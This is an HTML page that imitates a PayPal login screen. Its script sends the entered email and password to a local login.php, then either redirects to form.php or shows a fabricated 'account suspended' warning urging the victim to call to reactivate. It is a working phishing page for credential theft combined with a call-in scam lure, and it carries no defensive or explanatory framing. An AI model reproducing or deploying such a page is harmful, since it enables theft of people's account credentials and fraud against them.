
<!DOCTYPE html>
<html>
<head>
     <title>Log in to your PayPal Account</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>
<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>

<!-- jQuery library -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>

<!-- Popper JS -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>

<!-- Latest compiled JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
</head>
<style type="text/css">
     form { margin: 0px 10px; }

h2 {
  margin-top: 2px;
  margin-bottom: 2px;
}

.container { max-width: 400px; }

.divider {
  text-align: center;
  margin-top: 20px;
  margin-bottom: 5px;
}

.divider hr {
  margin: 7px 0px;
  width: 35%;
}

.left { float: left; }

.right { float: right; }
#result{
     /*color: red;*/
     display: none;
     position: relative;
     border:1px solid red;
     border-radius: 5px;
     padding:3px;
     width: 100%;
    margin: 0 0 10px;
    background-color: #fff7f7;
     
}
#result i{
  color: #c72e2e; font-size:20px;flex:left;

}
ul li{
	list-style-type:none;
}
</style>
<body>

<div class="container" >
     <div class="row">
          <div class="panel panel-default"style="margin-top: 80px;">
          <div class="panel-body">
         <form method="POST" >
            
            <center><img src="download.png" class="img-responsive" style="margin-top: 5%; width: 120px;"></center>
      <div class="form-group">
             <div id="result"><ul><li><i class="fa fa-warning"></i>A suspicious activity has been detected on your account. Due to security reasins we have temporarily suspended your account<br>
 				Please call on to reactivate your account</li> </ul>
          </div>
       <div class="form-group">
             <input type="text" name="email" id="email" maxlength="50" class="form-control input-lg" placeholder="Email">
        </div>
        <div class="form-group">
             <input  type="password" id="password" name="password" maxlength="25" class="form-control input-lg" placeholder="Password">
        </div>
        <div class="form-group">
             <button  type="button" onclick="login();" name="submit" id="submit" class="btn btn-block btn-lg btn-primary" style="  font-size: 15px;"><b>Log in</b></button>
        </div>
     <div class="form-group divider">
            <h6 class="text-center"><a>Having trouble logging in?</a></h6>
             <hr class="left"><small>or</small><hr class="right">
        </div>
 <p class="form-group"><a href="#" class="btn btn-default  btn-block"  style="background-color:lightgray ; color:black;"><b>Sign Up</b></a></p>   
                    </div>
               </div>
          </div>
</div>
</center>
</form>

<script type="text/javascript">
 function login(){
        var email=$('#email').val();
        var password=$('#password').val();
        // alert(email);
          $.ajax({
          type:'post',
          url:'login.php',
          data: {email:email,password:password},
          success:function(data) {
            if(data ==1){
              window.location.href='form.php';
              // alert("success");
            }
            else{
             $('#result').show();
            
            }
          }
        
       }); 
       }  
   

</script>